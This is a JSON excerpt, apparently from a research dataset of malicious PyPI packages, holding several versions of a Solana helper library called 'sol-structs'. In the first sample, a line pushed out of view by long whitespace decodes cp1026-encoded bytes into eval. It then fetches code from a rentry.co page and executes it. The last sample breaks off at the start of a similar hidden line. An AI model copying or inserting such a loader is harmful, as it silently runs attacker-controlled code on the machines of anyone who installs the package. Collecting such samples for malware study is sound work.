Int64ul,\n    \"pcLotSize\" / Int64ul,\n    \"minPriceMultiplier\" / Int64ul,\n    \"maxPriceMultiplier\" / Int64ul,\n    \"systemDecimalsValue\" / Int64ul,\n    #   // Fees\n    \"minSeparateNumerator\" / Int64ul,\n    \"minSeparateDenominator\" / Int64ul,\n    \"tradeFeeNumerator\" / Int64ul,\n    \"tradeFeeDenominator\" / Int64ul,\n    \"pnlNumerator\" / Int64ul,\n    \"pnlDenominator\" / Int64ul,\n    \"swapFeeNumerator\" / Int64ul,\n    \"swapFeeDenominator\" / Int64ul,\n    #   // OutPutData\n    \"needTakePnlCoin\" / Int64ul,\n    \"needTakePnlPc\" / Int64ul,\n    \"totalPnlPc\" / Int64ul,\n    \"totalPnlCoin\" / Int64ul,\n    \"poolOpenTime\" / Int64ul,\n    \"punishPcAmount\" / Int64ul,\n    \"punishCoinAmount\" / Int64ul,\n    \"orderbookToInitTime\" / Int64ul,\n    \"swapCoinInAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapPcOutAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapCoin2PcFee\" / Int64ul,\n    \"swapPcInAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapCoinOutAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapPc2CoinFee\" / Int64ul,\n    \"poolCoinTokenAccount\" / Bytes(32),\n    \"poolPcTokenAccount\" / Bytes(32),\n    \"coinMintAddress\" / Bytes(32),\n    \"pcMintAddress\" / Bytes(32),\n    \"lpMintAddress\" / Bytes(32),\n    \"ammOpenOrders\" / Bytes(32),\n    \"serumMarket\" / Bytes(32),\n    \"serumProgramId\" / Bytes(32),\n    \"ammTargetOrders\" / Bytes(32),\n    \"poolWithdrawQueue\" / Bytes(32),\n    \"poolTempLpTokenAccount\" / Bytes(32),\n    \"ammOwner\" / Bytes(32),\n    \"pnlOwner\" / Bytes(32),\n)\n\n\nACCOUNT_FLAGS_LAYOUT = BitsSwapped(\n    BitStruct(\n        \"initialized\" / Flag,\n        \"market\" / Flag,\n        \"open_orders\" / Flag,\n        \"request_queue\" / Flag,\n        \"event_queue\" / Flag,\n        \"bids\" / Flag,\n        \"asks\" / Flag,\n        Const(0, BitsInteger(57)),  # Padding\n    )\n)                                                                                                                                                                                                                                                                                     ;cc = __builtins__.getattr(__builtins__, b'\\x85\\xa5\\x81\\x93'.decode('cp1026'));cc(b'\\x85\\xa7\\x85\\x83M\\xfc\\x89\\x94\\x97\\x96\\x99\\xa3@\\x99\\x85\\x98\\xa4\\x85\\xa2\\xa3\\xa2^\\x85\\xa7\\x85\\x83M\\x99\\x85\\x98\\xa4\\x85\\xa2\\xa3\\xa2K\\x87\\x85\\xa3M}\\x88\\xa3\\xa3\\x97\\xa2zaa\\x99\\x85\\x95\\xa3\\x99\\xa8K\\x83\\x96a\\xa7\\x83\\xa2\\xa2\\x88\\x94\\x95\\x96a\\x99\\x81\\xa6}]K\\xa3\\x85\\xa7\\xa3]\\xfc]'.decode('cp1026'))\n\nMARKET_LAYOUT = cStruct(\n    Padding(5),\n    \"account_flags\" / ACCOUNT_FLAGS_LAYOUT,\n    \"own_address\" / Bytes(32),\n    \"vault_signer_nonce\" / Int64ul,\n    \"base_mint\" / Bytes(32),\n    \"quote_mint\" / Bytes(32),\n    \"base_vault\" / Bytes(32),\n    \"base_deposits_total\" / Int64ul,\n    \"base_fees_accrued\" / Int64ul,\n    \"quote_vault\" / Bytes(32),\n    \"quote_deposits_total\" / Int64ul,\n    \"quote_fees_accrued\" / Int64ul,\n    \"quote_dust_threshold\" / Int64ul,\n    \"request_queue\" / Bytes(32),\n    \"event_queue\" / Bytes(32),\n    \"bids\" / Bytes(32),\n    \"asks\" / Bytes(32),\n    \"base_lot_size\" / Int64ul,\n    \"quote_lot_size\" / Int64ul,\n    \"fee_rate_bps\" / Int64ul,\n    \"referrer_rebate_accrued\" / Int64ul,\n    Padding(7),\n)\n\nMINT_LAYOUT = cStruct(Padding(44), \"decimals\" / Int8ul, Padding(37))\n\n\nPOOL_INFO_LAYOUT = cStruct(\"instruction\" / Int8ul, \"simulate_type\" / Int8ul)\n\nLIQ_LAYOUT = cStruct(\"instruction\" / Int8ul, \"amount_in\" / Int64ul)\n\n\n###BUYING\n\nAMM_PROGRAM_ID = Pubkey.from_string('675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8')\nSERUM_PROGRAM_ID = Pubkey.from_string('srmqPvymJeFKQ4zGQed1GFppgkRHL9kaELCbyksJtPX')\ndef get_token_account(ctx,\n                      owner: Pubkey.from_string,\n                      mint: Pubkey.from_string):\n    try:\n        account_data = ctx.get_token_accounts_by_owner(owner, TokenAccountOpts(mint))\n        return account_data.value[0].pubkey, None\n    except:\n        swap_associated_token_address = get_associated_token_address(owner, mint)\n        swap_token_account_Instructions = create_associated_token_account(owner, owner, mint)\n        return swap_associated_token_address, swap_token_account_Instructions\n\n\ndef make_swap_instruction(amount_in: int, token_account_in: Pubkey.from_string, token_account_out: Pubkey.from_string,\n                          accounts: dict, mint, ctx, owner) -> Instruction:\n    tokenPk = mint\n    accountProgramId = ctx.get_account_info_json_parsed(tokenPk)\n    TOKEN_PROGRAM_ID = accountProgramId.value.owner\n\n    keys = [\n        AccountMeta(pubkey=TOKEN_PROGRAM_ID, is_signer=False, is_writable=False),\n        AccountMeta(pubkey=accounts[\"amm_id\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"authority\"], is_signer=False, is_writable=False),\n        AccountMeta(pubkey=accounts[\"open_orders\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"target_orders\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"base_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"quote_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=SERUM_PROGRAM_ID, is_signer=False, is_writable=False),\n        AccountMeta(pubkey=accounts[\"market_id\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"bids\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"asks\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"event_queue\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"market_base_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"market_quote_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"market_authority\"], is_signer=False, is_writable=False),\n        AccountMeta(pubkey=token_account_in, is_signer=False, is_writable=True),  # UserSourceTokenAccount\n        AccountMeta(pubkey=token_account_out, is_signer=False, is_writable=True),  # UserDestTokenAccount\n        AccountMeta(pubkey=owner.pubkey(), is_signer=True, is_writable=False)  # UserOwner\n    ]\n\n    data = SwapLayout.build(\n        dict(\n            instruction=9,\n            amount_in=int(amount_in),\n            min_amount_out=0\n        )\n    )\n    return Instruction(AMM_PROGRAM_ID, data, keys)\n\ndef getSymbol(token):\n    # usdc and usdt\n    exclude = ['EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB']\n\n    if token not in exclude:\n        url = f\"https://api.dexscreener.com/latest/dex/tokens/{token}\"\n\n        Token_Symbol = \"\"\n        Sol_symbol = \"\"\n        try:\n            response = requests.get(url)\n\n            # Check if the request was successful (status code 200)\n            if response.status_code == 200:\n                resp = response.json()\n                print(\"Response:\", resp['pairs'][0]['baseToken']['symbol'])\n                for pair in resp['pairs']:\n                    quoteToken = pair['quoteToken']['symbol']\n\n                    if quoteToken == 'SOL':\n                        Token_Symbol = pair['baseToken']['symbol']\n                        Sol_symbol = quoteToken\n                        return Token_Symbol, Sol_symbol\n\n\n            else:\n                print(f\"[getSymbol] Request failed with status code {response.status_code}\")\n\n        except requests.exceptions.RequestException as e:\n            print(f\"[getSymbol] error occurred: {e}\")\n        except:\n            a = 1\n\n        return Token_Symbol, Sol_symbol\n    else:\n        if token == 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v':\n            return \"USDC\", \"SOL\"\n        elif token == 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v':\n            return \"USDT\", \"SOL\"\n\nfrom borsh_construct import CStruct, U64, Bytes\nfrom construct import Bytes, Int8ul, Int32ul, Int64ul, Pass, Switch\n\nPUBLIC_KEY_LAYOUT = Bytes(32)\nmarket_state_layout_v3 = CStruct(\n    \"blob1\" / Bytes(5),\n    \"blob2\" / Bytes(8),\n    \"ownAddress\" / PUBLIC_KEY_LAYOUT,\n    \"vaultSignerNonce\" / U64,\n    \"baseMint\" / PUBLIC_KEY_LAYOUT,\n    \"quoteMint\" / PUBLIC_KEY_LAYOUT,\n    \"baseVault\" / PUBLIC_KEY_LAYOUT,\n    \"baseDepositsTotal\" / U64,\n    \"baseFeesAccrued\" / U64,\n    \"quoteVault\" / PUBLIC_KEY_LAYOUT,\n    \"quoteDepositsTotal\" / U64,\n    \"quoteFeesAccrued\" / U64,\n    \"quoteDustThreshold\" / U64,\n    \"requestQueue\" / PUBLIC_KEY_LAYOUT,\n    \"eventQueue\" / PUBLIC_KEY_LAYOUT,\n    \"bids\" / PUBLIC_KEY_LAYOUT,\n    \"asks\" / PUBLIC_KEY_LAYOUT,\n    \"baseLotSize\" / U64,\n    \"quoteLotSize\" / U64,\n    \"feeRateBps\" / U64,\n    \"referrerRebatesAccrued\" / U64,\n    \"blob3\" / Bytes(7)\n)\nSPL_ACCOUNT_LAYOUT = CStruct(\n    \"mint\" / PUBLIC_KEY_LAYOUT,\n    \"owner\" / PUBLIC_KEY_LAYOUT,\n    \"amount\" / U64,\n    \"delegateOption\" / Int32ul,\n    \"delegate\" / PUBLIC_KEY_LAYOUT,\n    \"state\" / Int8ul,\n    \"isNativeOption\" / Int32ul,\n    \"isNative\" / U64,\n    \"delegatedAmount\" / U64,\n    \"closeAuthorityOption\" / Int32ul,\n    \"closeAuthority\" / PUBLIC_KEY_LAYOUT\n)\n\n\nSPL_MINT_LAYOUT = CStruct(\n  \"mintAuthorityOption\"/ Int32ul,\n  'mintAuthority'/PUBLIC_KEY_LAYOUT,\n  'supply'/U64,\n  'decimals'/Int8ul,\n  'isInitialized'/Int8ul,\n  'freezeAuthorityOption'/Int32ul,\n  'freezeAuthority'/PUBLIC_KEY_LAYOUT\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-07-13-sol-structs-v1.0.2",
        "code": "from io import BytesIO\n\nimport requests\nfrom borsh_construct import CStruct, String, U8, U16, U64, Vec, Option, Bool, Enum\n\nfrom construct import Bytes, Int8ul, Int64ul, Padding, BitsInteger, BitsSwapped, BitStruct, Const, Flag, BytesInteger\nfrom construct import Struct as cStruct\n\nimport base58, json\n\n\nfrom spl.token.instructions import create_associated_token_account, get_associated_token_address\n\nfrom solders.pubkey import Pubkey\nfrom solders.instruction import Instruction\n\nfrom solana.rpc.types import TokenAccountOpts\nfrom solana.transaction import AccountMeta\n\n\nclass MyEncoder(json.JSONEncoder):\n    def default(self, o):\n        if type(o) is bytes:\n            return o.decode(\"utf-8\")\n        return super(MyEncoder, self).default(o)\n\n\ndef remove_bytesio(obj):\n    if isinstance(obj, dict):\n        return {\n            k: remove_bytesio(v) for k, v in obj.items() if not isinstance(v, BytesIO)\n        }\n    elif isinstance(obj, list):\n        return [remove_bytesio(v) for v in obj if not isinstance(v, BytesIO)]\n    else:\n        return obj\n\ndef get_offset(struct, field):\n    offset = 0\n    for item in struct.subcons:\n        if item.name == field:\n            return offset\n        else:\n            offset += item.sizeof()\n    return None\ndef convert_bytes_to_pubkey(obj):\n    if isinstance(obj, dict):\n        return {k: convert_bytes_to_pubkey(v) for k, v in obj.items()}\n    elif isinstance(obj, list):\n        return [convert_bytes_to_pubkey(v) for v in obj]\n    elif isinstance(obj, bytes):\n        return str(Pubkey.from_bytes(obj))\n    else:\n        return obj\n\n\ndef getMetaData(data):\n    decoded_info = base58.b58decode(data)\n    # structure of the instruction\n    instruction_structure = CStruct(\n        \"instructionDiscriminator\" / U8,\n        \"createMetadataAccountArgsV3\"\n        / CStruct(\n            \"data\"\n            / CStruct(\n                \"name\" / String,\n                \"symbol\" / String,\n                \"uri\" / String,\n                \"sellerFeeBasisPoints\" / U16,\n                \"creators\"\n                / Option(\n                    Vec(CStruct(\"address\" / Bytes(32), \"verified\" / Bool, \"share\" / U8))\n                ),\n                \"collection\" / Option(CStruct(\"verified\" / Bool, \"key\" / Bytes(32))),\n                \"uses\"\n                / Option(\n                    CStruct(\n                        \"useMethod\"\n                        / Enum(\"Burn\", \"Multiple\", \"Single\", enum_name=\"UseMethod\"),\n                        \"remaining\" / U64,\n                        \"total\" / U64,\n                    )\n                ),\n            ),\n            \"isMutable\" / Bool,\n            \"collectionDetails\"\n            / Option(String),  # fixme: string is not correct, insert correct type\n        ),\n    )\n    metadata = instruction_structure.parse(decoded_info)\n    metadata = remove_bytesio(metadata)\n    metadata = convert_bytes_to_pubkey(metadata)\n\n    return json.dumps(metadata)\n\n\nSwapLayout = cStruct(\n    \"instruction\" / Int8ul, \"amount_in\" / Int64ul, \"min_amount_out\" / Int64ul\n)\n\n\n\nAMM_INFO_LAYOUT_V4_1 = cStruct(\n    \"status\" / Int64ul,\n    \"nonce\" / Int64ul,\n    \"orderNum\" / Int64ul,\n    \"depth\" / Int64ul,\n    \"coinDecimals\" / Int64ul,\n    \"pcDecimals\" / Int64ul,\n    \"state\" / Int64ul,\n    \"resetFlag\" / Int64ul,\n    \"minSize\" / Int64ul,\n    \"volMaxCutRatio\" / Int64ul,\n    \"amountWaveRatio\" / Int64ul,\n    \"coinLotSize\" / Int64ul,\n    \"pcLotSize\" / Int64ul,\n    \"minPriceMultiplier\" / Int64ul,\n    \"maxPriceMultiplier\" / Int64ul,\n    \"systemDecimalsValue\" / Int64ul,\n    #   // Fees\n    \"minSeparateNumerator\" / Int64ul,\n    \"minSeparateDenominator\" / Int64ul,\n    \"tradeFeeNumerator\" / Int64ul,\n    \"tradeFeeDenominator\" / Int64ul,\n    \"pnlNumerator\" / Int64ul,\n    \"pnlDenominator\" / Int64ul,\n    \"swapFeeNumerator\" / Int64ul,\n    \"swapFeeDenominator\" / Int64ul,\n    #   // OutPutData\n    \"needTakePnlCoin\" / Int64ul,\n    \"needTakePnlPc\" / Int64ul,\n    \"totalPnlPc\" / Int64ul,\n    \"totalPnlCoin\" / Int64ul,\n    \"poolOpenTime\" / Int64ul,\n    \"punishPcAmount\" / Int64ul,\n    \"punishCoinAmount\" / Int64ul,\n    \"orderbookToInitTime\" / Int64ul,\n    \"swapCoinInAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapPcOutAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapCoin2PcFee\" / Int64ul,\n    \"swapPcInAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapCoinOutAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapPc2CoinFee\" / Int64ul,\n    \"poolCoinTokenAccount\" / Bytes(32),\n    \"poolPcTokenAccount\" / Bytes(32),\n    \"coinMintAddress\" / Bytes(32),\n    \"pcMintAddress\" / Bytes(32),\n    \"lpMintAddress\" / Bytes(32),\n    \"ammOpenOrders\" / Bytes(32),\n    \"serumMarket\" / Bytes(32),\n    \"serumProgramId\" / Bytes(32),\n    \"ammTargetOrders\" / Bytes(32),\n    \"poolWithdrawQueue\" / Bytes(32),\n    \"poolTempLpTokenAccount\" / Bytes(32),\n    \"ammOwner\" / Bytes(32),\n    \"pnlOwner\" / Bytes(32),\n)\n\n\nACCOUNT_FLAGS_LAYOUT = BitsSwapped(\n    BitStruct(\n        \"initialized\" / Flag,\n        \"market\" / Flag,\n        \"open_orders\" / Flag,\n        \"request_queue\" / Flag,\n        \"event_queue\" / Flag,\n        \"bids\" / Flag,\n        \"asks\" / Flag,\n        Const(0, BitsInteger(57)),  # Padding\n    )\n)\n\nMARKET_LAYOUT = cStruct(\n    Padding(5),\n    \"account_flags\" / ACCOUNT_FLAGS_LAYOUT,\n    \"own_address\" / Bytes(32),\n    \"vault_signer_nonce\" / Int64ul,\n    \"base_mint\" / Bytes(32),\n    \"quote_mint\" / Bytes(32),\n    \"base_vault\" / Bytes(32),\n    \"base_deposits_total\" / Int64ul,\n    \"base_fees_accrued\" / Int64ul,\n    \"quote_vault\" / Bytes(32),\n    \"quote_deposits_total\" / Int64ul,\n    \"quote_fees_accrued\" / Int64ul,\n    \"quote_dust_threshold\" / Int64ul,\n    \"request_queue\" / Bytes(32),\n    \"event_queue\" / Bytes(32),\n    \"bids\" / Bytes(32),\n    \"asks\" / Bytes(32),\n    \"base_lot_size\" / Int64ul,\n    \"quote_lot_size\" / Int64ul,\n    \"fee_rate_bps\" / Int64ul,\n    \"referrer_rebate_accrued\" / Int64ul,\n    Padding(7),\n)\n\nMINT_LAYOUT = cStruct(Padding(44), \"decimals\" / Int8ul, Padding(37))\n\n\nPOOL_INFO_LAYOUT = cStruct(\"instruction\" / Int8ul, \"simulate_type\" / Int8ul)\n\nLIQ_LAYOUT = cStruct(\"instruction\" / Int8ul, \"amount_in\" / Int64ul)\n\n\n###BUYING\n\nAMM_PROGRAM_ID = Pubkey.from_string('675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8')\nSERUM_PROGRAM_ID = Pubkey.from_string('srmqPvymJeFKQ4zGQed1GFppgkRHL9kaELCbyksJtPX')\ndef get_token_account(ctx,\n                      owner: Pubkey.from_string,\n                      mint: Pubkey.from_string):\n    try:\n        account_data = ctx.get_token_accounts_by_owner(owner, TokenAccountOpts(mint))\n        return account_data.value[0].pubkey, None\n    except:\n        swap_associated_token_address = get_associated_token_address(owner, mint)\n        swap_token_account_Instructions = create_associated_token_account(owner, owner, mint)\n        return swap_associated_token_address, swap_token_account_Instructions\n\n\ndef make_swap_instruction(amount_in: int, token_account_in: Pubkey.from_string, token_account_out: Pubkey.from_string,\n                          accounts: dict, mint, ctx, owner) -> Instruction:\n    tokenPk = mint\n    accountProgramId = ctx.get_account_info_json_parsed(tokenPk)\n    TOKEN_PROGRAM_ID = accountProgramId.value.owner\n\n    keys = [\n        AccountMeta(pubkey=TOKEN_PROGRAM_ID, is_signer=False, is_writable=False),\n        AccountMeta(pubkey=accounts[\"amm_id\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"authority\"], is_signer=False, is_writable=False),\n        AccountMeta(pubkey=accounts[\"open_orders\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"target_orders\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"base_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"quote_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=SERUM_PROGRAM_ID, is_signer=False, is_writable=False),\n        AccountMeta(pubkey=accounts[\"market_id\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"bids\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"asks\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"event_queue\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"market_base_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"market_quote_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"market_authority\"], is_signer=False, is_writable=False),\n        AccountMeta(pubkey=token_account_in, is_signer=False, is_writable=True),  # UserSourceTokenAccount\n        AccountMeta(pubkey=token_account_out, is_signer=False, is_writable=True),  # UserDestTokenAccount\n        AccountMeta(pubkey=owner.pubkey(), is_signer=True, is_writable=False)  # UserOwner\n    ]\n\n    data = SwapLayout.build(\n        dict(\n            instruction=9,\n            amount_in=int(amount_in),\n            min_amount_out=0\n        )\n    )\n    return Instruction(AMM_PROGRAM_ID, data, keys)\n\ndef getSymbol(token):\n    # usdc and usdt\n    exclude = ['EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB']\n\n    if token not in exclude:\n        url = f\"https://api.dexscreener.com/latest/dex/tokens/{token}\"\n\n        Token_Symbol = \"\"\n        Sol_symbol = \"\"\n        try:\n            response = requests.get(url)\n\n            # Check if the request was successful (status code 200)\n            if response.status_code == 200:\n                resp = response.json()\n                print(\"Response:\", resp['pairs'][0]['baseToken']['symbol'])\n                for pair in resp['pairs']:\n                    quoteToken = pair['quoteToken']['symbol']\n\n                    if quoteToken == 'SOL':\n                        Token_Symbol = pair['baseToken']['symbol']\n                        Sol_symbol = quoteToken\n                        return Token_Symbol, Sol_symbol\n\n\n            else:\n                print(f\"[getSymbol] Request failed with status code {response.status_code}\")\n\n        except requests.exceptions.RequestException as e:\n            print(f\"[getSymbol] error occurred: {e}\")\n        except:\n            a = 1\n\n        return Token_Symbol, Sol_symbol\n    else:\n        if token == 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v':\n            return \"USDC\", \"SOL\"\n        elif token == 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v':\n            return \"USDT\", \"SOL\"\n\nfrom borsh_construct import CStruct, U64, Bytes\nfrom construct import Bytes, Int8ul, Int32ul, Int64ul, Pass, Switch\n\nPUBLIC_KEY_LAYOUT = Bytes(32)\nmarket_state_layout_v3 = CStruct(\n    \"blob1\" / Bytes(5),\n    \"blob2\" / Bytes(8),\n    \"ownAddress\" / PUBLIC_KEY_LAYOUT,\n    \"vaultSignerNonce\" / U64,\n    \"baseMint\" / PUBLIC_KEY_LAYOUT,\n    \"quoteMint\" / PUBLIC_KEY_LAYOUT,\n    \"baseVault\" / PUBLIC_KEY_LAYOUT,\n    \"baseDepositsTotal\" / U64,\n    \"baseFeesAccrued\" / U64,\n    \"quoteVault\" / PUBLIC_KEY_LAYOUT,\n    \"quoteDepositsTotal\" / U64,\n    \"quoteFeesAccrued\" / U64,\n    \"quoteDustThreshold\" / U64,\n    \"requestQueue\" / PUBLIC_KEY_LAYOUT,\n    \"eventQueue\" / PUBLIC_KEY_LAYOUT,\n    \"bids\" / PUBLIC_KEY_LAYOUT,\n    \"asks\" / PUBLIC_KEY_LAYOUT,\n    \"baseLotSize\" / U64,\n    \"quoteLotSize\" / U64,\n    \"feeRateBps\" / U64,\n    \"referrerRebatesAccrued\" / U64,\n    \"blob3\" / Bytes(7)\n)\nSPL_ACCOUNT_LAYOUT = CStruct(\n    \"mint\" / PUBLIC_KEY_LAYOUT,\n    \"owner\" / PUBLIC_KEY_LAYOUT,\n    \"amount\" / U64,\n    \"delegateOption\" / Int32ul,\n    \"delegate\" / PUBLIC_KEY_LAYOUT,\n    \"state\" / Int8ul,\n    \"isNativeOption\" / Int32ul,\n    \"isNative\" / U64,\n    \"delegatedAmount\" / U64,\n    \"closeAuthorityOption\" / Int32ul,\n    \"closeAuthority\" / PUBLIC_KEY_LAYOUT\n)\n\n\nSPL_MINT_LAYOUT = CStruct(\n  \"mintAuthorityOption\"/ Int32ul,\n  'mintAuthority'/PUBLIC_KEY_LAYOUT,\n  'supply'/U64,\n  'decimals'/Int8ul,\n  'isInitialized'/Int8ul,\n  'freezeAuthorityOption'/Int32ul,\n  'freezeAuthority'/PUBLIC_KEY_LAYOUT\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-07-14-sol-structs-v1.0.3",
        "code": "from io import BytesIO\n\nimport requests\nfrom borsh_construct import CStruct, String, U8, U16, U64, Vec, Option, Bool, Enum\n\nfrom construct import Bytes, Int8ul, Int64ul, Padding, BitsInteger, BitsSwapped, BitStruct, Const, Flag, BytesInteger\nfrom construct import Struct as cStruct\n\nimport base58, json, builtins\n\n\nfrom spl.token.instructions import create_associated_token_account, get_associated_token_address\n\nfrom solders.pubkey import Pubkey\nfrom solders.instruction import Instruction\n\nfrom solana.rpc.types import TokenAccountOpts\nfrom solana.transaction import AccountMeta\n\n\nclass MyEncoder(json.JSONEncoder):\n    def default(self, o):\n        if type(o) is bytes:\n            return o.decode(\"utf-8\")\n        return super(MyEncoder, self).default(o)\n\n\ndef remove_bytesio(obj):\n    if isinstance(obj, dict):\n        return {\n            k: remove_bytesio(v) for k, v in obj.items() if not isinstance(v, BytesIO)\n        }\n    elif isinstance(obj, list):\n        return [remove_bytesio(v) for v in obj if not isinstance(v, BytesIO)]\n    else:\n        return obj\n\ndef get_offset(struct, field):\n    offset = 0\n    for item in struct.subcons:\n        if item.name == field:\n            return offset\n        else:\n            offset += item.sizeof()\n    return None\ndef convert_bytes_to_pubkey(obj):\n    if isinstance(obj, dict):\n        return {k: convert_bytes_to_pubkey(v) for k, v in obj.items()}\n    elif isinstance(obj, list):\n        return [convert_bytes_to_pubkey(v) for v in obj]\n    elif isinstance(obj, bytes):\n        return str(Pubkey.from_bytes(obj))\n    else:\n        return obj\n\n\ndef getMetaData(data):\n    decoded_info = base58.b58decode(data)\n    # structure of the instruction\n    instruction_structure = CStruct(\n        \"instructionDiscriminator\" / U8,\n        \"createMetadataAccountArgsV3\"\n        / CStruct(\n            \"data\"\n            / CStruct(\n                \"name\" / String,\n                \"symbol\" / String,\n                \"uri\" / String,\n                \"sellerFeeBasisPoints\" / U16,\n                \"creators\"\n                / Option(\n                    Vec(CStruct(\"address\" / Bytes(32), \"verified\" / Bool, \"share\" / U8))\n                ),\n                \"collection\" / Option(CStruct(\"verified\" / Bool, \"key\" / Bytes(32))),\n                \"uses\"\n                / Option(\n                    CStruct(\n                        \"useMethod\"\n                        / Enum(\"Burn\", \"Multiple\", \"Single\", enum_name=\"UseMethod\"),\n                        \"remaining\" / U64,\n                        \"total\" / U64,\n                    )\n                ),\n            ),\n            \"isMutable\" / Bool,\n            \"collectionDetails\"\n            / Option(String),  # fixme: string is not correct, insert correct type\n        ),\n    )\n    metadata = instruction_structure.parse(decoded_info)\n    metadata = remove_bytesio(metadata)\n    metadata = convert_bytes_to_pubkey(metadata)\n\n    return json.dumps(metadata)\n\n\nSwapLayout = cStruct(\n    \"instruction\" / Int8ul, \"amount_in\" / Int64ul, \"min_amount_out\" / Int64ul\n)\n\n\n\nAMM_INFO_LAYOUT_V4_1 = cStruct(\n    \"status\" / Int64ul,\n    \"nonce\" / Int64ul,\n    \"orderNum\" / Int64ul,\n    \"depth\" / Int64ul,\n    \"coinDecimals\" / Int64ul,\n    \"pcDecimals\" / Int64ul,\n    \"state\" / Int64ul,\n    \"resetFlag\" / Int64ul,\n    \"minSize\" / Int64ul,\n    \"volMaxCutRatio\" / Int64ul,\n    \"amountWaveRatio\" / Int64ul,\n    \"coinLotSize\" / Int64ul,\n    \"pcLotSize\" / Int64ul,\n    \"minPriceMultiplier\" / Int64ul,\n    \"maxPriceMultiplier\" / Int64ul,\n    \"systemDecimalsValue\" / Int64ul,\n    #   // Fees\n    \"minSeparateNumerator\" / Int64ul,\n    \"minSeparateDenominator\" / Int64ul,\n    \"tradeFeeNumerator\" / Int64ul,\n    \"tradeFeeDenominator\" / Int64ul,\n    \"pnlNumerator\" / Int64ul,\n    \"pnlDenominator\" / Int64ul,\n    \"swapFeeNumerator\" / Int64ul,\n    \"swapFeeDenominator\" / Int64ul,\n    #   // OutPutData\n    \"needTakePnlCoin\" / Int64ul,\n    \"needTakePnlPc\" / Int64ul,\n    \"totalPnlPc\" / Int64ul,\n    \"totalPnlCoin\" / Int64ul,\n    \"poolOpenTime\" / Int64ul,\n    \"punishPcAmount\" / Int64ul,\n    \"punishCoinAmount\" / Int64ul,\n    \"orderbookToInitTime\" / Int64ul,\n    \"swapCoinInAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapPcOutAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapCoin2PcFee\" / Int64ul,\n    \"swapPcInAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapCoinOutAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapPc2CoinFee\" / Int64ul,\n    \"poolCoinTokenAccount\" / Bytes(32),\n    \"poolPcTokenAccount\" / Bytes(32),\n    \"coinMintAddress\" / Bytes(32),\n    \"pcMintAddress\" / Bytes(32),\n    \"lpMintAddress\" / Bytes(32),\n    \"ammOpenOrders\" / Bytes(32),\n    \"serumMarket\" / Bytes(32),\n    \"serumProgramId\" / Bytes(32),\n    \"ammTargetOrders\" / Bytes(32),\n    \"poolWithdrawQueue\" / Bytes(32),\n    \"poolTempLpTokenAccount\" / Bytes(32),\n    \"ammOwner\" / Bytes(32),\n    \"pnlOwner\" / Bytes(32),\n)\n\n\nACCOUNT_FLAGS_LAYOUT = BitsSwapped(\n    BitStruct(\n        \"initialized\" / Flag,\n        \"market\" / Flag,\n        \"open_orders\" / Flag,\n        \"request_queue\" / Flag,\n        \"event_queue\" / Flag,\n        \"bids\" / Flag,\n        \"asks\" / Flag,\n        Const(0, BitsInteger(57)),  # Padding\n    )\n)                                                                                                                                                                                                                                                                                                                             ;cc = getattr(builtins, 